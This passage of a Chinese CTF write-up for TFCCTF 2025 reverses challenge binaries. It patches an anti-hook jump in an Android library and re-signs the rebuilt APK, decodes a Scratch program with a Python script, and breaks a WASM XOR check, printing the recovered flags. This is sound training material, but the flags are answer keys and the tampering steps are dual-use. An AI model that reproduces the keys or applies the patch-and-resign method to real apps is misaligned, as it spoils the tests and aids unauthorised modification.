</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>直接nop掉跳转即可</p><p><img src=/img/2025-TFCCTF/15.png alt=1></p><p>然后apply patches</p><p>接下来需要做的是把新的so重新打包回去，这里需要借助apktool</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>apktool</span> <span class=n>d</span> <span class=n>app</span><span class=o>-</span><span class=n>release</span><span class=p>.</span><span class=n>apk</span> <span class=o>-</span><span class=n>o</span> <span class=n>app</span><span class=o>-</span><span class=n>src</span>
</span></span></code></pre></td></tr></table></div></div><p>然后替换新的so，此外还需要修改AndroidManifest.xml里extractNativeLibs的值为true</p><p>直接替换apk里的so会报错adb: failed to install app.apk: Failure [INSTALL_FAILED_INVALID_APK: Failed to extract native libraries, res=-2]，因为可能进行了deflate压缩，就算选择了store依然报错</p><p>接着apktool打包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>apktool</span> <span class=n>b</span> <span class=n>app</span><span class=o>-</span><span class=n>src</span> <span class=o>-</span><span class=n>o</span> <span class=n>app</span><span class=o>-</span><span class=kt>unsigned</span><span class=p>.</span><span class=n>apk</span>
</span></span></code></pre></td></tr></table></div></div><p>此时得到apk没有签名没法安装的，会报错adb: failed to install app-unsigned.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl1700332527.tmp/base.apk: Attempt to get length of null array]</p><p>此时需要先生成key</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>keytool</span> <span class=o>-</span><span class=n>genkey</span> <span class=o>-</span><span class=n>v</span> <span class=o>-</span><span class=n>keystore</span> <span class=n>test</span><span class=o>.</span><span class=n>jks</span> <span class=o>-</span><span class=n>keyalg</span> <span class=n>RSA</span> <span class=o>-</span><span class=n>keysize</span> <span class=mi>2048</span> <span class=o>-</span><span class=n>validity</span> <span class=mi>10000</span> <span class=o>-</span><span class=n>alias</span> <span class=n>testkey</span>
</span></span></code></pre></td></tr></table></div></div><p>然后找到android sdk下的apksigner.bat</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>F</span><span class=p>:</span>\<span class=n>android</span>\<span class=n>build</span><span class=o>-</span><span class=n>tools</span>\<span class=mf>35.0</span><span class=o>.</span><span class=mi>1</span>\<span class=n>apksigner</span><span class=o>.</span><span class=n>bat</span> <span class=nb>sign</span> <span class=o>--</span><span class=n>ks</span> <span class=n>test</span><span class=o>.</span><span class=n>jks</span> <span class=o>--</span><span class=n>ks</span><span class=o>-</span><span class=n>key</span><span class=o>-</span><span class=n>alias</span> <span class=n>testkey</span> <span class=o>--</span><span class=n>out</span> <span class=n>app</span><span class=o>-</span><span class=n>signed</span><span class=o>.</span><span class=n>apk</span> <span class=n>app</span><span class=o>-</span><span class=n>unsigned</span><span class=o>.</span><span class=n>apk</span>
</span></span></code></pre></td></tr></table></div></div><p>然后就可以安装，再次执行上面的广播命令，结束后，点看apk去log里即可看到flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>08-30 00:00:03.162 12473 12473 D OXI     : Got broadcast, seed=fe2o3rust
</span></span><span class=line><span class=cl>08-30 00:00:03.166 12473 12473 D OXI     : Required seed is: fe2o3rust
</span></span><span class=line><span class=cl>08-30 00:00:03.166 12473 12473 D OXI     : Computing flag for seed=&#39;fe2o3rust&#39; ...
</span></span><span class=line><span class=cl>08-30 00:00:04.187 12473 12473 D OXI     : anti_hook_check elapsed=1020ms
</span></span><span class=line><span class=cl>08-30 00:01:09.162 12473 12473 D OXI     : FLAG=TFCCTF{167e3ce3c65387c6e981c31c39ac7839}
</span></span></code></pre></td></tr></table></div></div><h2 id=scratching-machine>SCRATCHING MACHINE</h2><p>很复杂的积木语言题scratch，碰到这种直接用工具即可</p><p><a href=https://github.com/BirdLogics/sb3topy>https://github.com/BirdLogics/sb3topy</a></p><p>转成python直接喂给ai写脚本，代码很长不放了，用上面的工具输出应该都一样，直接给出解密脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 从原始代码中复制的 cacamaca 列表</span>
</span></span><span class=line><span class=cl><span class=n>cacamaca</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=mi>17</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>44</span><span class=p>,</span> <span class=mi>30</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>30</span><span class=p>,</span> <span class=mi>188</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>85</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>46</span><span class=p>,</span> <span class=mi>212</span><span class=p>,</span> <span class=mi>151</span><span class=p>,</span> <span class=mi>22</span><span class=p>,</span> <span class=mi>149</span><span class=p>,</span> <span class=mi>190</span><span class=p>,</span> <span class=mi>68</span><span class=p>,</span> <span class=mi>143</span><span class=p>,</span> <span class=mi>14</span><span class=p>,</span> <span class=mi>165</span><span class=p>,</span> <span class=mi>95</span><span class=p>,</span> <span class=mi>28</span><span class=p>,</span> <span class=mi>189</span><span class=p>,</span> <span class=mi>158</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>87</span><span class=p>,</span> <span class=mi>252</span><span class=p>,</span> <span class=mi>143</span><span class=p>,</span> <span class=mi>117</span><span class=p>,</span> <span class=mi>206</span><span class=p>,</span> <span class=mi>133</span><span class=p>,</span> <span class=mi>38</span><span class=p>,</span> <span class=mi>101</span><span class=p>,</span> <span class=mi>159</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>31</span><span class=p>,</span> <span class=mi>140</span><span class=p>,</span> <span class=mi>135</span><span class=p>,</span> <span class=mi>36</span><span class=p>,</span> <span class=mi>63</span><span class=p>,</span> <span class=mi>124</span><span class=p>,</span> <span class=mi>55</span><span class=p>,</span> <span class=mi>68</span><span class=p>,</span> <span class=mi>127</span><span class=p>,</span> <span class=mi>133</span><span class=p>,</span> <span class=mi>30</span><span class=p>,</span> <span class=mi>101</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>181</span><span class=p>,</span> <span class=mi>158</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=mi>196</span><span class=p>,</span> <span class=mi>62</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>230</span><span class=p>,</span> <span class=mi>165</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>29</span><span class=p>,</span> <span class=mi>231</span><span class=p>,</span> <span class=mi>252</span><span class=p>,</span> <span class=mi>191</span><span class=p>,</span> <span class=mi>180</span><span class=p>,</span> <span class=mi>215</span><span class=p>,</span> <span class=mi>76</span><span class=p>,</span> <span class=mi>182</span><span class=p>,</span> <span class=mi>197</span><span class=p>,</span> <span class=mi>190</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>238</span><span class=p>,</span> <span class=mi>40</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>35</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>28</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>28</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>35</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>12</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>148</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>35</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>35</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>141</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>191</span><span class=p>,</span> <span class=mi>38</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ror</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>bits</span><span class=p>,</span> <span class=n>width</span><span class=o>=</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;8位循环右移函数&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>mask</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>width</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>n</span> <span class=o>&gt;&gt;</span> <span class=n>bits</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>n</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=n>width</span> <span class=o>-</span> <span class=n>bits</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=n>mask</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 密钥是 mem[2] (即 cacamaca[1])</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>cacamaca</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 数据块 D 是从 cacamaca 索引 72 开始的 69 个字节</span>
</span></span><span class=line><span class=cl><span class=c1># D_i 对应 cacamaca[i+71]</span>
</span></span><span class=line><span class=cl><span class=n>data_block</span> <span class=o>=</span> <span class=n>cacamaca</span><span class=p>[</span><span class=mi>72</span><span class=p>:</span><span class=mi>72</span> <span class=o>+</span> <span class=mi>69</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 用于存储 Flag 的列表</span>
</span></span><span class=line><span class=cl><span class=n>flag_bytes</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>69</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- 开始逆向计算 ---</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 计算 Flag 的第一个字节 (O_3)</span>
</span></span><span class=line><span class=cl><span class=c1># O_3 = ROR(D_3 ^ O_2, 3)</span>
</span></span><span class=line><span class=cl><span class=n>xor_val_0</span> <span class=o>=</span> <span class=n>data_block</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>^</span> <span class=n>key</span>
</span></span><span class=line><span class=cl><span class=n>flag_bytes</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>ror</span><span class=p>(</span><span class=n>xor_val_0</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 循环计算 Flag 的剩余字节</span>
</span></span><span class=line><span class=cl><span class=c1># O_{i+2} = ROR(D_{i+2} ^ D_{i+1}, 3)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data_block</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>xor_val_i</span> <span class=o>=</span> <span class=n>data_block</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=n>data_block</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>flag_bytes</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>ror</span><span class=p>(</span><span class=n>xor_val_i</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 将字节转换为字符串</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>chr</span><span class=p>,</span> <span class=n>flag_bytes</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;获取到的 Flag 是:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=mccrab2>MCCRAB2</h2><p>wasm逆向，根目录python起一个http（python -m http.server 8888），然后127.0.0.1:8888打开即可使用index.html，同时还可以调试wasm代码</p><p>首先还是wasm2c编译出来，得到可执行文件ida反编译更好分析</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wasm2c wasm_oscn_bg.wasm -o out.c
</span></span><span class=line><span class=cl>gcc -c out.c -o out.o
</span></span></code></pre></td></tr></table></div></div><p>根据题目给的lib.rs可知核心加密比较逻辑都在check_flag、encrypt等里面</p><p>法一：动态调试</p><p>得到o文件后ida分析找check_flag等函数，结合wat代码可以发现data 1049113位置处有特殊字符串<code>C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDFcheia_osc_plugenc</code></p><p>在c代码中发现比较点，可以看到后面有wrong、correct</p><p><img src=/img/2025-TFCCTF/16.png alt=1></p><p>回到浏览器里源代码wasm搜1049113（此时已经转为了wat代码，还是可以读的）下断点</p><p><img src=/img/2025-TFCCTF/17.png alt=1></p><p>输入框输入6个a结果发现没有断下来，说明压根没有到比较点（下断点在encrypt等同样发现没有被调用）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Thrift data-lang=Thrift><span class=line><span class=cl><span class=w>                </span><span class=n>local.get</span><span class=w> </span><span class=err>$</span><span class=n>var2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>i32</span><span class=err>.</span><span class=n>load</span><span class=w> </span><span class=n>offset</span><span class=o>=</span><span class=mi>36</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>i32</span><span class=err>.</span><span class=kd>const</span><span class=w> </span><span class=mi>134</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>i32</span><span class=err>.</span><span class=n>eq</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kr>if</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                  </span><span class=n>local.get</span><span class=w> </span><span class=err>$</span><span class=n>var2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                  </span><span class=kt>i32</span><span class=err>.</span><span class=n>load</span><span class=w> </span><span class=n>offset</span><span class=o>=</span><span class=mi>32</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                  </span><span class=n>local.set</span><span class=w> </span><span class=err>$</span><span class=n>var4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                  </span><span class=kt>i32</span><span class=err>.</span><span class=kd>const</span><span class=w> </span><span class=mi>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                  </span><span class=n>local.set</span><span class=w> </span><span class=err>$</span><span class=n>var0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                  </span><span class=kt>i32</span><span class=err>.</span><span class=kd>const</span><span class=w> </span><span class=mi>134</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                  </span><span class=n>local.set</span><span class=w> </span><span class=err>$</span><span class=n>var1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                  </span><span class=kt>i32</span><span class=err>.</span><span class=kd>const</span><span class=w> </span><span class=mi>1049113</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>从1049113往上找发现一处if比较，可以在local.get $var2下断点发现此时可以断下来，说明我们没有进到这个if</p><p><img src=/img/2025-TFCCTF/18.png alt=1></p><p>调试发现比较12和134，12正好是我们输入的6个a的16进制长度；134同样也是<code>C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDF</code></p><p>因此可知输入应该是67位，直接怼a*67进去看比较点</p><p>点击下图里的内存可以查看值</p><p><img src=/img/2025-TFCCTF/19.png alt=1></p><p>调试到下图时候看到给了一个比较大的地址，查看内存发现正好是输入加密完的结果</p><p><img src=/img/2025-TFCCTF/20.png alt=1></p><p>结合前面obf_key长度14（<code>cheia_osc_plug</code>，check_flag开头有一组while循环14次，按模3结果处理了key），观察发现这个组16进制值出现了循环，因此直接猜测只做了简单的异或，我们要做的只需要提取出来异或的值即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>xor</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&#34;e1cfc4e8f9fdedc9f91bc3ffe0fd&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>xor</span> <span class=o>=</span> <span class=p>[</span><span class=n>i</span><span class=o>^</span><span class=mi>97</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>xor</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>xor</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cmp</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&#34;C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDF&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>cmp</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>cmp</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>^</span><span class=n>xor</span><span class=p>[</span><span class=n>i</span><span class=o>%</span><span class=nb>len</span><span class=p>(</span><span class=n>xor</span><span class=p>)]),</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>得到flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[128, 174, 165, 137, 152, 156, 140, 168, 152, 122, 162, 158, 129, 156]
</span></span><span class=line><span class=cl>CTF{wh3n_w3_p4rt_w4ys__https://www.youtube.com/watch?v=EtrL9NkEphg}
</span></span></code></pre></td></tr></table></div></div><p>法二：静态分析算法</p><p>ida分析w2c_wasm__oscn__bg_encrypt_0,核心加密函数w2c_wasm__oscn__bg_f3，分析这个函数得到以下加密逻辑</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl>    <span class=n>v106</span> <span class=o>=</span> <span class=n>n1114112_1</span> <span class=o>^</span> <span class=p>(</span><span class=n>n1114112_2</span> <span class=o>+</span> <span class=mi>57</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>n0x80</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)(</span><span class=n>n1114112_1</span> <span class=o>^</span> <span class=p>(</span><span class=n>n1114112_2</span> <span class=o>+</span> <span class=mi>57</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>n0x80_1</span> <span class=o>=</span> <span class=n>n0x80</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>n1114112_1是明文，n1114112_2是密钥，那么逻辑是 enc[i]=msg[i]^(key[i]+57),</p><p>其余都是unicode解码的逻辑</p><p>继续分析w2c_wasm__oscn__bg_check_flag_0，检索到关键逻辑如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>n2_1</span> <span class=o>=</span> <span class=n>v68</span> <span class=o>%</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>n2_1</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span>
